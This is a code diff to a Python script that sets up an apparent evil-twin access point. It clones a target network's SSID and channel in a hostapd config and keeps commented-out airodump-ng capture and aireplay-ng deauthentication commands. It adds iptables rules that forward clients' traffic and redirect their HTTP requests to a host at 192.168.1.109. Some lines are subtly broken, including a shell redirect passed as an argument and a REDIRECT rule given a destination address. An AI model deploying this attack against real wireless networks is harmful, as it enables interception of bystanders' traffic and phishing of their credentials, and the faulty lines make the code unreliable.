@@ -40,13 +40,20 @@ with open('hostapd.conf', 'w') as f:
     f.write('ssid=' + name[1:] + '\n')
     f.write('hw_mode=g\n')
     f.write('channel=' + channel + '\n')
-    f.write('macaddr_acl=0\n')
-    f.write('ignore_broadcast_ssid=0\n')
     #f.write('wpa_passphrase=password\n')
 
 
 #subprocess.call(['airodump-ng', '--bssid', macAddr, '-w', 'client_bssids', '--output-format', 'csv', 'wlan0mon'])
 #subprocess.call(['aireplay-ng', '--deauth', '20'  , '-a', macAddr, 'wlan0mon'])
+
+# Configure iptables to reroute traffic
+subprocess.call(['ifconfig', 'wlan0mon', 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
+subprocess.call(['route', 'add', '-net', '192.168.1.0', 'netmask', '255.255.255.0', 'gw', '192.168.1.1'])
+subprocess.call(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', 'eth0', '-j', 'MASQUERADE'])
+subprocess.call(['iptables', '--append', 'FORWARD', '--in-interface', 'wlan0mon', '-j', 'ACCEPT'])
+subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
+subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-destination', '192.168.1.109:80'])
+subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])
 
 subprocess.Popen(['hostapd', 'hostapd.conf'])
 
@@ -62,7 +69,4 @@ with open('dnsmasq.conf', 'w') as f:
     f.write('log-dhcp\n')
     f.write('listen-address=127.0.0.1\n')
 
-subprocess.call(['ifconfig', 'wlan0mon', 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
-subprocess.call(['route', 'add', '-net', '192.168.1.0', 'netmask', '255.255.255.0', 'gw', '192.168.1.1'])
-subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
 subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])
